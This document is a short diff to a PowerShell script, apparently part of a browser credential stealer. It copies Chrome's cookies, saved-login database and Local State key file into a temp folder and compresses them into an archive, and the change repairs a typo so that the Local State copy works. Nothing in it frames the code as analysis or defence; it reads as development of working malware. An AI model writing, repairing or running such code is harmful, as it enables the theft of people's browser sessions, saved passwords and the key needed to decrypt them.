@@ -51,7 +51,7 @@ mkdir $env:tmp\Google-UserData
 
 Copy-Item -Path $GcookiesPath -Destination $GoogleFolderPath -Force
 Copy-Item -Path $GLoginPath -Destination $GoogleFolderPath -Force
-Copy-Item -Path $GLocalStatePath -Destination $GoogleFolderPath - Force
+Copy-Item -Path $GLocalStatePath -Destination $GoogleFolderPath -Force
 Compress-Archive -Path $GoogleFolderPath -DestinationPath $GfilePath
 
 #------------------------------------------------------------------------------------------------------------------------------------
